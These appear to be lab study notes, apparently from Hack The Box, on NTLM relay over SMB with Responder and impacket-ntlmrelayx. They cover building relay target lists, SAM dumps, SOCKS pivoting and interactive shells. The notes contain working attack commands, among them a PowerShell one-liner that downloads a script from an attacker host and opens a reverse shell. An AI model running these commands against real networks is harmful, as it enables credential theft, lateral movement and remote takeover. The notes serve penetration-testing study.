We can perform the most know attack of NTLM relay over SMB.

## Prerequisites
We must remove SMB from the Responder configuration over our machne.
```shell-session
sed -i "s/SMB = On/SMB = Off/" Responder.conf
yovecio@htb[/htb]$ cat Responder.conf | grep -i smb

SMB = Off
```

## Attack path
We must first gather a list over all the machines that have **SMB Signing=Off**
```
netexec smb --gen-relay-list targets.txt $SUBNET
```
We setup responder listening over the target interface.
```shell-session
 sudo python3 Responder.py -I ens192
```
And the ntlmrelayx to relay by using the targte list created before.
```shell-session
impacket-ntlmrelayx -tf relayTargets.txt -smb2support
```
The tool will try to perform a SAM dump by default. You can also send some commands as well.
```shell-session
impacket-ntlmrelayx -tf relayTargets.txt -smb2support -c 'ping -n 1 172.16.117.30'
```
Or gain a reverse shell!
```shell-session
impacket-ntlmrelayx -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
```

## Multi-relay
The tool supports a variety of sources that it fetches during relaying, where we saw in the previous attack a list created by Netexec. 
But the source file can contain:
- List of IP
- SPN + IP (ex. SMB://IP)
- Targeting a specific username
```shell-session
smb://INLANEFREIGHT\\PETER@172.16.117.50
```
- And many more

## Socks connections
This feauture acts like a "keep-alive" connection by using socks proxy will keep alive all connections and allow you by using socks+proxychains to interact to all the services you might need.
You can setup the tool in socks mode with this commando.
```shell-session
impacket-ntlmrelayx -tf relayTargets.txt -smb2support -socks
```
Setup Responder listening(remember to disable SMB spoofing from responder config file).
```shell-session
sudo responder -I ens192
```
You can check the captured connection in ntlmrelayx with this command.
```shell-session
ntlmrelayx> socks

Protocol  Target         Username              AdminStatus  Port 
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.50  INLANEFREIGHT/RMONTY  FALSE        445  
SMB       172.16.117.50  INLANEFREIGHT/PETER   TRUE         445  
SMB       172.16.117.50  INLANEFREIGHT/NPORTS  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/RMONTY  FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/PETER   FALSE        445  
SMB       172.16.117.60  INLANEFREIGHT/NPORTS  FALSE        445
```
And you can interact to the chosen via Proxychains (*Socks5 1080/tcp*)
```shell-session
proxychains4 -q impacket-smbexec INLANEFREIGHT/PETER@172.16.117.50 -no-pass
```

## Interactive shells
The last option is to use what so called "Interactive Shells" where the tool will spawn automatically a shell over SMB(where the authentication was possible via relay).
```shell-session
impacket-ntlmrelayx -tf relayTargets.txt -smb2support -i

Impacket v0.11.0 - Copyright 2023 Fortra
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/RMONTY SUCCEED
```
Allowing you to use NC to connect back to a interactive(SEMI) shell.
```shell-session
nc -nv 127.0.0.1 11000

Connection to 127.0.0.1 11000 port [tcp/*] succeeded!
Type help for list of commands
# shares

ADMIN$
C$
Finance
IPC$
```